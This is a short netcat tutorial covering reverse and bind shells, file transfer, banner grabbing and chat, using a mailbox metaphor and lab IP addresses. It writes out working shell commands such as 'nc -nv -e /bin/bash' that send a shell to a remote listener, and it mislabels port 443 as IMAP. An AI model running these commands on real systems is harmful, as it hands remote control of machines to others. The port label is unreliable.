Netcat can read & write TCP/UDP ports. Here are a few different use-cases for it.

## Reverse Shell
A Reverse Shell involves opening a port locally and then, getting a remote node to send you a shell. As a metaphor, imagine Bob has a mailbox (the port). Since he is interested in what is going on elsewhere, he gets Alice to give him a subscription to the city newspaper (a shell) where she lives. Instead of driving downtown and directly probing for information, Bob simply waits for the newspaper to show up.

By the way, for those who have not caught on yet (took me a while) the character of Alice is used to denote “point A” while Bob is used as “point B.” Therefore, one can infer a direction by following the normal convention of “point A to point B.”

In the following example, Bob has the IP address of `192.168.5.2`.
```bash
nc -lnvp 8888			# Bob; the mailbox
```
```bash
nc -nv -e /bin/bash 192.168.5.2 # Alice; the newspaper
```
```bash
[ Intranet | Extranet ]
        Firewall
	   |
	   |
     {     |x----}	# Bob can't get a Bind Shell (inbound rules)
Alice{	   | 	 }Bob
     {~~~~~|~~~~>}	# So he uses a Reverse Shell (no proxy/outbound rules)  
     	   |     
	   |	  
```

## Bind Shell
```bash
nc -lnvp 8888 -e /bin/bash # binds a shell to port 8888
```
```bash
nc -nv 192.168.5.1 8888	   # accesses port/shell on the remote node
```

## File Transfer
Open a port, direct everything a file. Redirect file to recently opened port.
```bash
nc -lnvp 8888 > incoming.exe 	       		# do on system needing file
```
```bash
nc -nv 192.168.5.1 8888 < /path/to/file.exe 	# do on system with file
```

## Banner Grabbing
Banner grabbing is a technique used to collect service version information from a remote node. For example, each command sentence below provokes verbose output from a target.
```bash
nc -nv 192.168.5.2 25  # SMTP
nc -nv 192.168.5.2 110 # POP3
nc -nv 192.168.5.2 443 # IMAP
```

## Raw Chat
Output will be the same on both ends of the socket.
```bash
nc -lnvp 8888	   # server; his IP address = 192.168.5.1
nc -nv 192.168.5.1 # client; connects to server
```
